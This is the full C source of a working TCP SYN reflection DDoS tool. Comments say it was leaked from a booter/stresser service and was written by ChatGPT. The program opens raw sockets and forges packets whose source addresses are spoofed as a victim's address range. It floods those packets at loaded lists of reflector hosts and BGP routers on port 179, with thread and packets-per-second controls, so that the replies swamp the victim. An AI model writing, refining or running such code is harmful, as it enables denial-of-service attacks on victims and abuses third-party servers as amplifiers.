/*gcc -pthread tcp-amp.c -o tcp-amp -lm*/
// Method leaked by Echo (Owner of EliteStress.st)
// Coded by ChatGPT but Netty aka Scroll (@cxmmand) claims he wrote it.
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <math.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
unsigned long targetAddress;

struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
typedef struct list list_t;
typedef struct list bpg_list;
struct tcpOptions
{
	uint8_t msskind;
	uint8_t msslen;
	uint16_t mssvalue;
	uint8_t nop_nouse;
	uint8_t wskind;
	uint8_t wslen;
	uint8_t wsshiftcount;
	uint8_t nop_nouse2;
	uint8_t nop_nouse3;
	uint8_t sackkind;
	uint8_t sacklen;
	/*
	uint8_t tstamp;
	uint8_t tslen;
	uint8_t tsno;
	uint8_t tsclockval;
	uint8_t tssendval;
	uint8_t tsval;
	uint8_t tsclock;
	uint8_t tsecho;
	uint8_t tsecho2;
	uint8_t tsecho3;
	uint8_t tsecho4;
	*/
};

struct list *head;
struct list *tail;

struct thread_data
{
	int thread_id;
	struct list *list_node;
	struct sockaddr_in *sins;
	unsigned long num_ips;
	struct list *bpg_list_node;
};

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++)
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;

	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;

	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}

	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
		sum += *(unsigned char *)buf;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int optionLen)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;

	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = 6;
	pseudohead.length = htons(sizeof(struct tcphdr) + optionLen);
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + optionLen;
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + optionLen);
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
	iph->id = htonl(rand_cmwc() & 0xFFFF);
	iph->frag_off = 0;
	iph->ttl = randnum(64, 255);
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("0.0.0.0");
}

int sPorts[2] = {80, 443};
int windows[4] = {8192, 65535, 14600, 64240};

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->dest = htons(sPorts[rand_cmwc() % 2]);
	tcph->source = htons(floodport);
	tcph->ack = 0;
	tcph->psh = 0;
	tcph->fin = 0;
	tcph->rst = 0;
	tcph->res2 = 1;
	tcph->doff = (sizeof(struct tcphdr) + sizeof(struct tcpOptions)) / 4;
	tcph->syn = 1;
	tcph->urg = 0;
	tcph->urg_ptr = 0;
	tcph->window = 8192;
	tcph->check = 0;
	tcph->ack_seq = 0;
}

void setup_tcpopts_header(struct tcpOptions *opts)
{
	int mssValues[] = {
		1240,
		1460,
		1464,
		1468,
		1472,
		1476,
		1480,
		1484,
		1488,
		1492,
		1496,
		1500};

	opts->nop_nouse = 0x01;
	opts->nop_nouse2 = 0x01;
	opts->nop_nouse3 = 0x01;
	opts->msskind = 0x02;
	opts->mssvalue = htons(mssValues[rand_cmwc() % (sizeof(mssValues) / sizeof(mssValues[0]))]);
	opts->msslen = 0x04;
	opts->wskind = 0x03;
	opts->wslen = 0x03;
	opts->wsshiftcount = 0x07;
	opts->sackkind = 0x04;
	opts->sacklen = 0x02;
	/*
	opts->tstamp = 0x08;
	opts->tslen = 0x0a;
	opts->tsno = randnum(1, 250);
	opts->tsclockval = 0x68;
	opts->tssendval = 0xa3;
	opts->tsval = 0xd8;
	opts->tsclock = 0xd9;
	opts->tsecho = 0x00;
	opts ->tsecho2 = 0x00;
	opts->tsecho3 = 0x00;
	opts->tsecho4 = 0x00;
	*/
}

void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct tcpOptions *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);

	struct sockaddr_in *sins = td->sins;
	struct list *list_node = td->list_node;
	struct list *bpg_list_node = td->bpg_list_node;

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	setup_tcpopts_header(opts);
	iph->saddr = sins[0].sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;

	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	int sn_i = 0;
	while (1)
	{
		tcph->check = 0;
		iph->check = 0;
		int bpgOrDrd = randnum(0, 1);
		iph->saddr = sins[sn_i].sin_addr.s_addr;
		iph->ttl = randnum(64, 255);
		tcph->window = htons(windows[rand_cmwc() % 4]);
		iph->id = htonl(rand_cmwc() & 0xFFFF);
		tcph->seq = htonl(randnum(1000000, 9999999));
		if (bpgOrDrd == 1)
		{
			if (floodport == 0)
			{
				tcph->source = htons(randnum(49152, 65535));
			}
			else
			{
				if (randnum(0, 1) == 1)
				{
					tcph->source = htons(179);
				}
				else
				{
					tcph->source = htons(floodport);
				}
			}
			tcph->res2 = 0;
			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
			tcph->dest = htons(179);
			bpg_list_node = bpg_list_node->next;
			iph->daddr = bpg_list_node->data.sin_addr.s_addr;
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
			iph->check = csum((unsigned short *)datagram, iph->tot_len);
			sendto(s, datagram, iph->tot_len, 0,
				   (struct sockaddr *)&bpg_list_node->data, sizeof(bpg_list_node->data));
			continue;
		}
		else
		{
			if (floodport == 0)
			{
				if (randnum(0, 1) == 1)
				{
					tcph->dest = htons(randnum(1, 65535));
					tcph->source = htons(sPorts[rand_cmwc() % 2]);
				}
				else
				{
					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
					tcph->source = htons(randnum(1, 65535));
				}
			}
			else
			{
				tcph->source = htons(floodport);
				tcph->dest = htons(sPorts[rand_cmwc() % 2]);
			}
			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
			setup_tcpopts_header(opts);
			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
			list_node = list_node->next;
			iph->daddr = list_node->data.sin_addr.s_addr;
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
			iph->check = csum((unsigned short *)datagram, iph->tot_len);

			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
		}

		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
		//  printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));

		pps++;

		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
		sn_i++;
		if (sn_i >= td->num_ips)
		{
			sn_i = 0;
		}
	}
}
void extractIpOctets(const char *sourceString, short *ipAddress)
{
	memset(ipAddress, 0, 4);
	unsigned short len = 0;
	unsigned char oct[4] = {0}, cnt = 0, cnt1 = 0, i, buf[5];

	printf("Parsing IP: %s\n", sourceString);
	len = strlen(sourceString);
	for (i = 0; i < len; i++)
	{
		if (sourceString[i] != '.')
		{
			buf[cnt++] = sourceString[i];
		}
		if (sourceString[i] == '.' || i == len - 1)
		{
			buf[cnt] = '\0';
			cnt = 0;
			oct[cnt1++] = atoi(buf);
		}
	}
	ipAddress[0] = oct[0];
	ipAddress[1] = oct[1];
	ipAddress[2] = oct[2];
	ipAddress[3] = oct[3];
	printf("Parsed octets: %d.%d.%d.%d\n",
		   ipAddress[0], ipAddress[1],
		   ipAddress[2], ipAddress[3]); // Debug output
}

unsigned int ip2ui(char *ip)
{
	/* An IP consists of four ranges. */
	long ipAsUInt = 0;
	/* Deal with first range. */
	char *cPtr = strtok(ip, ".");
	if (cPtr)
		ipAsUInt += atoi(cPtr) * pow(256, 3);

	/* Proceed with the remaining ones. */
	int exponent = 2;
	while (cPtr && exponent >= 0)
	{
		cPtr = strtok(NULL, ".\0");
		if (cPtr)
			ipAsUInt += atoi(cPtr) * pow(256, exponent--);
	}

	return ipAsUInt;
}

char *ui2ip(unsigned int ip)
{
	static char ipstr[16];
	snprintf(ipstr, sizeof(ipstr), "%u.%u.%u.%u",
			 (ip >> 24) & 0xFF,
			 (ip >> 16) & 0xFF,
			 (ip >> 8) & 0xFF,
			 ip & 0xFF);
	return ipstr;
}

unsigned int createBitmask(const char *bitmask)
{
	unsigned int times = (unsigned int)atol(bitmask) - 1, i, bitmaskAsUInt = 1;
	/* Fill in set bits (1) from the right. */
	for (i = 0; i < times; ++i)
	{
		bitmaskAsUInt <<= 1;
		bitmaskAsUInt |= 1;
	}
	/* Shift in unset bits from the right. */
	for (i = 0; i < 32 - times - 1; ++i)
		bitmaskAsUInt <<= 1;
	return bitmaskAsUInt;
}
struct list *loadList(const char *filename, size_t max_len, int *out_count)
{
	printf("DEBUG: Entering loadList for file: %s\n", filename); // Debug 1
	FILE *file = fopen(filename, "r");
	if (!file)
	{
		fprintf(stderr, "Error opening file: %s\n", filename);
		return NULL;
	}
	printf("DEBUG: File opened successfully\n"); // Debug 2

	struct list *head = NULL, *tail = NULL;
	char buffer[128];
	int line_count = 0;

	while (fgets(buffer, sizeof(buffer), file))
	{
		line_count++;

		// Clean the line
		buffer[strcspn(buffer, "\r\n")] = 0;

		struct list *new_node = (struct list *)malloc(sizeof(struct list));
		if (!new_node)
		{
			fprintf(stderr, "Memory allocation failed\n");
			break;
		}
		memset(new_node, 0, sizeof(struct list));

		new_node->data.sin_family = AF_INET;
		new_node->data.sin_addr.s_addr = inet_addr(buffer);
		if (new_node->data.sin_addr.s_addr == INADDR_NONE)
		{
			printf("DEBUG: Invalid IP address: %s\n", buffer); // Debug 5
			free(new_node);
			continue;
		}

		new_node->next = NULL;

		if (!head)
		{
			head = new_node;
			tail = new_node;
			new_node->prev = new_node; // Circular link
		}
		else
		{
			tail->next = new_node;
			new_node->prev = tail;
			tail = new_node;
			tail->next = head; // Circular link
			head->prev = tail; // Circular link
		}
	}

	fclose(file);
	if (out_count)
		*out_count = line_count;
	printf("DEBUG: Loaded %d IPs from %s\n", line_count, filename); // Debug 8
	return head;
}

int main(int argc, char *argv[])
{
	if (argc < 8)
	{
		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [Drdos List] [BGP List]\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	fprintf(stdout, "Preparing...\n");
	printf("DEBUG: Starting initialization\n"); // Debug 9

	int max_len = 128;
	int i = 0;
	char *buffer = (char *)malloc(max_len);
	head = NULL;
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	int count = 0;

	printf("DEBUG: Before loading DRDoS list\n"); // Debug 10
	list_t *current = loadList(argv[6], max_len, &count);
	printf("DEBUG: After loading DRDoS list, count=%d\n", count); // Debug 11

	printf("DEBUG: Before loading BGP list\n"); // Debug 12
	bpg_list *bgpCurr = loadList(argv[7], max_len, &count);
	printf("DEBUG: After loading BGP list, count=%d\n", count); // Debug 13

	// Check if lists loaded successfully
	if (!current || !bgpCurr)
	{
		fprintf(stderr, "Failed to load one or both IP lists\n");
		exit(-1);
	}

	pthread_t thread[num_threads];
	char *ip, *bitmask;
	ip = strtok(argv[1], "/");
	if (!ip)
	{
		fprintf(stderr, "Error: Invalid IP address format.\n");
		exit(-1);
	}
	bitmask = strtok(NULL, "\0");
	if (!bitmask)
	{
		fprintf(stderr, "Error: Invalid CIDR notation.\n");
		exit(-1);
	}

	unsigned int ipAsUInt = ip2ui(ip);
	unsigned int mask_bits = (unsigned int)atol(bitmask);
	unsigned int bitmaskAsUInt = createBitmask(bitmask);

	char networkAddrBuf[16], broadcastAddrBuf[16];
	strcpy(networkAddrBuf, ui2ip(ipAsUInt & bitmaskAsUInt));
	strcpy(broadcastAddrBuf, ui2ip(ipAsUInt | ~bitmaskAsUInt));

	char *networkAddress = networkAddrBuf;
	char *broadcastAddress = broadcastAddrBuf;

	unsigned long num_ips = 1;
	for (i = 32; i > mask_bits; i--)
	{
		num_ips *= 2;
	}

	printf("Number of IPs to reflect to: %ld \r\n", num_ips);
	struct sockaddr_in *sins = malloc(num_ips * sizeof(struct sockaddr_in));
	short network_octets[4], broadcast_octets[4];
	extractIpOctets(networkAddress, network_octets);
	extractIpOctets(broadcastAddress, broadcast_octets);

	int ips = 0;

	for (int ip = ntohl(inet_addr(networkAddress)); ip <= ntohl(inet_addr(broadcastAddress)); ip++)
	{
		struct in_addr addr;
		addr.s_addr = htonl(ip);
		sins[ips].sin_family = AF_INET;
		sins[ips].sin_addr = addr;

		char ipAddr[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &addr, ipAddr, sizeof(ipAddr));
		printf("%d: %s\n", ips + 1, ipAddr);
		ips++;
	}

	int multiplier = 20;
	struct thread_data td[num_threads];

	for (i = 0; i < num_threads; i++)
	{
		td[i].thread_id = i;
		td[i].sins = sins;
		td[i].num_ips = ips;
		td[i].list_node = current;	   // All threads start at head
		td[i].bpg_list_node = bgpCurr; // All threads start at head

		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
		{
			fprintf(stderr, "Failed to create thread\n");
			exit(-1);
		}
	}

	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
				sleeptime += 100;

			else
				limiter--;
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
				sleeptime -= 25;

			else
				sleeptime = 0;
		}
		pps = 0;
	}
	return 0;
}